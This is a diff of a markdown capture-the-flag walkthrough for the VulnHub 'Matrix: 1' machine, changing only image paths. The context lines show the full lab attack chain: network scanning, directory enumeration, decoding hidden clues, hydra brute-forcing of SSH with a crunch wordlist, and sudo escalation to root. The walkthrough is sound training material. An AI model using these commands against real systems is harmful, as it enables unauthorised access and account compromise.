@@ -3,7 +3,7 @@
 - **Machine:** Matrix: 1
 - **Download:** https://www.vulnhub.com/entry/matrix-1,259/
 
-![](836-1.png)
+![](images/836-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](836-2.png)
+![](images/836-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Run a full scan to enumerate open ports, services, operating system information,
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.169
 ```
 
-![](836-3.png)
+![](images/836-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ Run the HTTP enumeration script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.169
 ```
 
-![](836-4.png)
+![](images/836-4.png)
 
 ---
 
@@ -80,7 +80,7 @@ Enumerate hidden directories.
 gobuster dir -u http://192.168.2.169/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
-![](836-5.png)
+![](images/836-5.png)
 
 Discovered endpoint:
 
@@ -100,7 +100,7 @@ Inspect the page source.
 view-source:http://192.168.2.169:31337/
 ```
 
-![](836-6.png)
+![](images/836-6.png)
 
 An encoded Base64 string is discovered.
 
@@ -116,7 +116,7 @@ ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywg
 echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
 ```
 
-![](836-7.png)
+![](images/836-7.png)
 
 The decoded output references another file.
 
@@ -126,7 +126,7 @@ Visit:
 
 The server downloads a file.
 
-![](836-8.png)
+![](images/836-8.png)
 
 The contents are encoded using **Brainfuck**.
 
@@ -134,7 +134,7 @@ Decode it using:
 
 - https://www.dcode.fr/brainfuck-language
 
-![](836-9.png)
+![](images/836-9.png)
 
 Decoded message:
 
@@ -162,7 +162,7 @@ Since only the last two characters are unknown, generate a custom wordlist using
 crunch 8 8 -t k1ll0r%@ -o wordlist.txt
 ```
 
-![](836-10.png)
+![](images/836-10.png)
 
 Brute-force the SSH login.
 
@@ -170,7 +170,7 @@ Brute-force the SSH login.
 hydra -l guest -P wordlist.txt ssh://192.168.2.169
 ```
 
-![](836-11.png)
+![](images/836-11.png)
 
 Recovered credentials:
 
@@ -185,7 +185,7 @@ Login through SSH.
 ssh guest@192.168.2.169
 ```
 
-![](836-12.png)
+![](images/836-12.png)
 
 Successfully obtained SSH access.
 
@@ -213,7 +213,7 @@ Verify the current shell.
 echo $0
 ```
 
-![](836-13.png)
+![](images/836-13.png)
 
 Set standard environment variables.
 
@@ -231,7 +231,7 @@ Verify.
 echo $SHELL
 ```
 
-![](836-14.png)
+![](images/836-14.png)
 
 ---
 
@@ -243,7 +243,7 @@ Enumerate sudo privileges.
 sudo -l
 ```
 
-![](836-15.png)
+![](images/836-15.png)
 
 Switch to the root account.
 
@@ -253,7 +253,7 @@ sudo su
 
 The system requests the user's password.
 
-![](836-16.png)
+![](images/836-16.png)
 
 After authentication, verify privileges.
 
@@ -261,7 +261,7 @@ After authentication, verify privileges.
 id
 ```
 
-![](836-17.png)
+![](images/836-17.png)
 
 List the root directory.
 
@@ -269,7 +269,7 @@ List the root directory.
 ls
 ```
 
-![](836-18.png)
+![](images/836-18.png)
 
 Read the final flag.
 
@@ -277,7 +277,7 @@ Read the final flag.
 cat flag.txt
 ```
 
-![](836-19.png)
+![](images/836-19.png)
 
 ---
 
